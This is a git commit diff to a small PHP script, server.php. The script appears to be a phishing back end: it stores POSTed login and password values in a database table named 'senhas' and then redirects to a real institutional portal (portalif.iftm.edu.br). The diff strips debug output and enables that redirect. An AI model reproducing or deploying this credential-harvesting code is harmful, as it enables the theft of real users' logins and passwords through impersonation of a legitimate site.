3336c2abb069b019697757c69f3b4235760350bb
Leonardo Vilarinho <leonardo-i@outlook.com>
2017-04-27 19:56:27 -0300

    alterando server

--- server.php
+++ server.php
@@ -4,9 +4,6 @@ $dbhost = '';
 $dbname = '';
 $dbusername = '';
 $dbpassword = '';
-var_dump($_POST);
-
-
 
 foreach ($_SERVER as $key => $value) {
     if (strpos($key, "MYSQLCONNSTR_localdb") !== 0) {
@@ -23,20 +20,14 @@ foreach ($_SERVER as $key => $value) {
 //localdb
 
 $conn = new mysqli($dbhost, $dbusername, $dbpassword, 'localdb');
-echo "oiiii1";
 mysqli_set_charset($conn, 'utf8');
-echo "oiiii2";
 if ( !$conn->connect_errno and isset($_POST['login']) and isset($_POST['senha']) ) {
-    echo "oiiii3";
     $stmt = $conn->prepare("INSERT INTO senhas (login, senha) VALUES (?,?)");
-echo "oiiii4";
     $stmt->bind_param('ss', $_POST['login'], $_POST['senha']);
-    echo "oiiii5";
     $stmt->execute();
-    echo "oiiii6";
     $stmt->close();
 }
 
 $conn->close();
 
-// header('https://portalif.iftm.edu.br');
+header('https://portalif.iftm.edu.br');
